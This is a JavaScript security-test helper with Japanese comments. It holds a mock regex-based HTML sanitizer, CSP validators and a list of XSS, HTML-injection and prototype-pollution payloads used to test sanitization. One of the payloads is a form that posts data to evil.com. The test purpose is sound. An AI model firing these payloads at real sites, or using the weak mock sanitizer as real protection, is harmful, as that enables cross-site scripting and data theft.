/**
 * セキュリティテスト専用ヘルパー
 * DOMPurifyとCSP検証のためのユーティリティ
 */

/**
 * DOMPurifyテスト用ヘルパー
 * 実際のDOMPurifyライブラリのモック実装
 */
export const mockDOMPurify = {
  /**
   * シンプルなHTMLサニタイゼーション（テスト用）
   * 実際の実装ではDOMPurifyライブラリを使用
   */
  sanitize(input, options = {}) {
    if (typeof input !== 'string') {
      return '';
    }

    let sanitized = input;

    // 基本的な危険タグの除去
    const dangerousTags = [
      /<script[^>]*>.*?<\/script>/gis,
      /<iframe[^>]*>.*?<\/iframe>/gis,
      /<object[^>]*>.*?<\/object>/gis,
      /<embed[^>]*>/gis,
      /<link[^>]*>/gis,
      /<meta[^>]*>/gis,
      /<style[^>]*>.*?<\/style>/gis
    ];

    dangerousTags.forEach(pattern => {
      sanitized = sanitized.replace(pattern, '');
    });

    // 危険な属性の除去
    const dangerousAttributes = [
      /on\w+\s*=\s*["'][^"']*["']/gis,
      /javascript\s*:/gis,
      /data\s*:\s*text\/html/gis,
      /vbscript\s*:/gis
    ];

    dangerousAttributes.forEach(pattern => {
      sanitized = sanitized.replace(pattern, '');
    });

    // オプション処理
    if (options.ALLOWED_TAGS) {
      // 許可タグのフィルタリング（簡易実装）
      const allowedTags = options.ALLOWED_TAGS;
      const tagPattern = /<(\/?)([\w-]+)[^>]*>/gis;
      
      sanitized = sanitized.replace(tagPattern, (match, closing, tagName) => {
        if (allowedTags.includes(tagName.toLowerCase())) {
          return match;
        }
        return '';
      });
    }

    if (options.STRIP_HTML) {
      // HTMLタグの完全除去
      sanitized = sanitized.replace(/<[^>]*>/g, '');
    }

    return sanitized;
  },

  /**
   * サニタイゼーション結果の検証
   */
  isClean(input) {
    const sanitized = this.sanitize(input);
    return sanitized === input;
  },

  /**
   * 設定可能なフックのモック
   */
  addHook(hookName, callback) {
    // テスト用のシンプルなフック実装
    this.hooks = this.hooks || {};
    this.hooks[hookName] = this.hooks[hookName] || [];
    this.hooks[hookName].push(callback);
  }
};

/**
 * CSP（Content Security Policy）テストヘルパー
 */
export const cspTestHelpers = {
  /**
   * CSPヘッダーの検証
   */
  validateCSPHeader(cspString) {
    const policies = cspString.split(';').map(p => p.trim());
    const validatedPolicies = {};

    policies.forEach(policy => {
      const [directive, ...values] = policy.split(' ');
      if (directive) {
        validatedPolicies[directive] = values;
      }
    });

    return validatedPolicies;
  },

  /**
   * CSP違反の検出テスト
   */
  testCSPViolation(directive, source) {
    // テスト用CSP違反検出ロジック
    const violations = [];

    // script-src違反
    if (directive === 'script-src') {
      if (source.includes('unsafe-inline') && source.includes('<script>')) {
        violations.push('Inline script detected with unsafe-inline');
      }
      if (source.includes('unsafe-eval') && (source.includes('eval(') || source.includes('Function('))) {
        violations.push('eval() usage detected with unsafe-eval');
      }
    }

    // style-src違反
    if (directive === 'style-src') {
      if (source.includes('unsafe-inline') && source.includes('style=')) {
        violations.push('Inline style detected with unsafe-inline');
      }
    }

    return violations;
  },

  /**
   * 推奨CSP設定の生成
   */
  generateRecommendedCSP() {
    return {
      'default-src': ["'self'"],
      'script-src': ["'self'", "'unsafe-hashes'"],
      'style-src': ["'self'", "'unsafe-inline'"],
      'img-src': ["'self'", 'data:', 'https:'],
      'font-src': ["'self'", 'https:'],
      'connect-src': ["'self'"],
      'frame-ancestors': ["'none'"],
      'base-uri': ["'self'"],
      'form-action': ["'self'"]
    };
  }
};

/**
 * セキュリティ脅威パターンジェネレーター
 */
export const threatPatterns = {
  /**
   * XSS攻撃パターン（レベル別）
   */
  xss: {
    basic: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>'
    ],
    advanced: [
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>'
    ],
    obfuscated: [
      '<img src=x oneRRor="alert(1)">',
      '<svg><script>alert&#40;1&#41;</script></svg>',
      '<script>eval(atob("YWxlcnQoJ1hTUycp"))</script>'
    ]
  },

  /**
   * HTMLインジェクションパターン
   */
  htmlInjection: [
    '<h1>Injected Content</h1>',
    '<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:red;">Overlay</div>',
    '<form action="http://evil.com" method="post"><input type="hidden" name="data" value="stolen"></form>'
  ],

  /**
   * JavaScriptインジェクションパターン
   */
  jsInjection: [
    'javascript:alert("Injected")',
    'data:text/html,<script>alert("Injected")</script>',
    'vbscript:msgbox("Injected")'
  ],

  /**
   * プロトタイプ汚染パターン
   */
  prototypePollution: [
    '{"__proto__":{"isAdmin":true}}',
    '{"constructor":{"prototype":{"isAdmin":true}}}',
    '{"__proto__.isAdmin":true}'
  ]
};

/**
 * セキュリティテスト実行器
 */
export const securityTestRunner = {
  /**
   * XSSテストスイート実行
   */
  runXSSTests(sanitizeFn, testElement) {
    const results = [];

    // 基本XSSテスト
    threatPatterns.xss.basic.forEach((pattern, index) => {
      try {
        const sanitized = sanitizeFn(pattern);
        const isClean = !sanitized.includes('<script>') && !sanitized.includes('onerror=');
        
        results.push({
          test: `Basic XSS #${index + 1}`,
          input: pattern,
          output: sanitized,
          passed: isClean,
          message: isClean ? 'XSS blocked successfully' : 'XSS not blocked - SECURITY RISK'
        });
      } catch (error) {
        results.push({
          test: `Basic XSS #${index + 1}`,
          input: pattern,
          passed: false,
          error: error.message
        });
      }
    });

    return results;
  },

  /**
   * CSPテストスイート実行
   */
  runCSPTests(cspHeader) {
    const results = [];
    const parsedCSP = cspTestHelpers.validateCSPHeader(cspHeader);

    // 必須ディレクティブの確認
    const requiredDirectives = ['default-src', 'script-src', 'style-src'];
    
    requiredDirectives.forEach(directive => {
      const hasDirective = directive in parsedCSP;
      results.push({
        test: `Required directive: ${directive}`,
        passed: hasDirective,
        message: hasDirective ? `${directive} is configured` : `${directive} is missing`
      });
    });

    // 危険な設定の検出
    if (parsedCSP['script-src'] && parsedCSP['script-src'].includes("'unsafe-eval'")) {
      results.push({
        test: 'Unsafe eval detection',
        passed: false,
        message: 'unsafe-eval detected in script-src - SECURITY RISK'
      });
    }

    return results;
  },

  /**
   * 統合セキュリティテスト
   */
  runComprehensiveSecurityTest(sanitizeFn, cspHeader, testElement) {
    const results = {
      xss: this.runXSSTests(sanitizeFn, testElement),
      csp: this.runCSPTests(cspHeader),
      timestamp: new Date().toISOString()
    };

    // 総合評価
    const allTests = [...results.xss, ...results.csp];
    const passedTests = allTests.filter(test => test.passed).length;
    const totalTests = allTests.length;

    results.summary = {
      totalTests,
      passedTests,
      failedTests: totalTests - passedTests,
      passRate: Math.round((passedTests / totalTests) * 100),
      securityRating: this.calculateSecurityRating(passedTests, totalTests)
    };

    return results;
  },

  /**
   * セキュリティ評価の計算
   */
  calculateSecurityRating(passed, total) {
    const passRate = passed / total;
    if (passRate >= 0.95) return 'EXCELLENT';
    if (passRate >= 0.85) return 'GOOD';
    if (passRate >= 0.70) return 'ACCEPTABLE';
    if (passRate >= 0.50) return 'POOR';
    return 'CRITICAL';
  }
};

/**
 * セキュリティアサーション拡張
 */
export const securityAssertions = {
  /**
   * XSS耐性のアサーション
   */
  toBeXSSResistant(received, patterns = threatPatterns.xss.basic) {
    let passed = true;
    const failures = [];

    patterns.forEach(pattern => {
      if (received.includes(pattern) || received.includes('<script>')) {
        passed = false;
        failures.push(pattern);
      }
    });

    return {
      pass: passed,
      message: () => passed 
        ? `Expected input to NOT be XSS resistant, but it was clean`
        : `Expected input to be XSS resistant, but found vulnerabilities: ${failures.join(', ')}`
    };
  },

  /**
   * HTMLサニタイゼーションのアサーション
   */
  toBeSanitized(received, original) {
    const isClean = !received.includes('<script>') && 
                   !received.includes('onerror=') && 
                   !received.includes('javascript:');

    return {
      pass: isClean,
      message: () => isClean
        ? `Expected "${received}" to NOT be sanitized`
        : `Expected "${received}" to be properly sanitized`
    };
  },

  /**
   * CSP準拠のアサーション
   */
  toComplyWithCSP(received, cspDirectives) {
    const violations = cspTestHelpers.testCSPViolation('script-src', received);
    const isCompliant = violations.length === 0;

    return {
      pass: isCompliant,
      message: () => isCompliant
        ? `Expected content to NOT comply with CSP`
        : `Expected content to comply with CSP, but found violations: ${violations.join(', ')}`
    };
  }
};